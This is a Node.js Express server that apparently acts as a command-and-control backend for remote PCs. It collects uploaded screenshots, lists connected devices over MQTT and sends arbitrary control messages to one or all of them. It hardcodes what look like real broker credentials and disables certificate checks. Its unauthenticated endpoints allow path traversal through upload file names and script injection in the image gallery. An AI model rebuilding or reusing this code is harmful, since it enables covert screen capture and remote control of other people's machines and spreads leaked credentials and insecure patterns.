const express = require("express");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const mqtt = require("mqtt");

const app = express();
const upload = multer({ dest: "uploads/" });

// --- MQTT Setup ---
const BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com";
const PORT = 8883;
const USERNAME = "aryanvish2006";
const PASSWORD = "aryanvish2006saniya";

const mqttClient = mqtt.connect(`mqtts://${BROKER}:${PORT}`, {
  username: USERNAME,
  password: PASSWORD,
  rejectUnauthorized: false // set true if using proper CA cert
});

const knownClients = new Set();

mqttClient.on("connect", () => {
  console.log("Connected to MQTT broker");
  // Subscribe to all ACK topics
  mqttClient.subscribe("ack/+");
});

mqttClient.on("message", (topic, message) => {
  const msg = message.toString();
  if (topic.startsWith("ack/")) {
    const clientId = topic.replace("ack/", "");
    knownClients.add(clientId);
    console.log(`ACK from ${clientId}: ${msg}`);
  }
});

// --- Express Server ---
const server = app.listen(3000, () => console.log("Server running at 3000"));

let connectFlag = false;
let lastTrackedDevice = null;

// --- Poll connect flag ---
app.get("/shouldconnect", (req, res) => {
  res.json({ connect: connectFlag });
});

app.get("/setconnect/:value", (req, res) => {
  connectFlag = req.params.value === "true";
  res.send(`connectFlag set to ${connectFlag}`);
});

// --- File Uploads ---
app.post("/upload", upload.single("screenshot"), (req, res) => {
  const savePath = path.join("uploads", req.file.originalname);
  fs.renameSync(req.file.path, savePath);
  console.log("Saved screenshot:", req.file.originalname);
  res.send("Saved");
});

app.use("/uploads", express.static(path.join(__dirname, "uploads")));

app.get("/listuploads", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err) return res.status(500).send("Failed to read uploads folder");
    const imageUrls = files.map(file => `http://localhost:3000/uploads/${file}`);
    res.json(imageUrls);
  });
});

app.get("/latestupload", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err || files.length === 0) return res.status(404).send("No uploads");
    const latestFile = files
      .map(file => ({ file, time: fs.statSync(path.join(dirPath, file)).mtime }))
      .sort((a, b) => b.time - a.time)[0].file;
    res.sendFile(path.join(dirPath, latestFile));
  });
});

app.get("/showuploads", (req, res) => {
  const dirPath = path.join(__dirname, "uploads");
  fs.readdir(dirPath, (err, files) => {
    if (err || files.length === 0) return res.status(404).send("No uploads");
    const images = files.filter(f => /\.(png|jpg|jpeg|gif)$/i.test(f));
    let html = "<h1>Uploaded Images</h1>";
    images.forEach(file => {
      html += `<div><img src="/uploads/${file}" style="max-width:500px;margin:10px"/><p>${file}</p></div>`;
    });
    res.send(html);
  });
});

// --- Clients ---
app.get("/clients", (req, res) => {
  res.json(Array.from(knownClients).map((deviceName, index) => ({
    id: index,
    deviceName
  })));
});

// --- Send to single client ---
app.get("/send", (req, res) => {
  const pcId = req.query.pc_id;
  const msg = req.query.msg;
  if (!pcId || !msg) return res.send("Usage: /send?pc_id=<id>&msg=yourMessage");
  const topic = `control/${pcId}`;
  mqttClient.publish(topic, msg);
  res.send(`Message sent to ${pcId}: ${msg}`);
});

// --- Broadcast ---
app.get("/broadcast", (req, res) => {
  const msg = req.query.msg;
  if (!msg) return res.send("Usage: /broadcast?msg=yourMessage");
  const clients = req.query.clients ? req.query.clients.split(",") : Array.from(knownClients);
  clients.forEach(pcId => mqttClient.publish(`control/${pcId}`, msg));
  res.send("Message broadcasted to all selected devices");
});

// --- Trace ---
app.get("/posttrace", (req, res) => {
  const pcName = req.query.pc_id?.trim();
  if (!pcName) return res.status(400).send("Missing pc_id");
  lastTrackedDevice = pcName;
  console.log("Tracked device:", pcName);
  res.send("Device tracked");
});

app.get("/trace", (req, res) => {
  if (!lastTrackedDevice) return res.json({ message: "No device has been tracked yet" });
  const devices = Array.from(knownClients);
  const trackedIndex = devices.indexOf(lastTrackedDevice);
  res.json({
    "CTRL+SHIFT+Q pressed UserIndex": trackedIndex >= 0 ? trackedIndex : "Not connected",
    "deviceId": lastTrackedDevice
  });
});
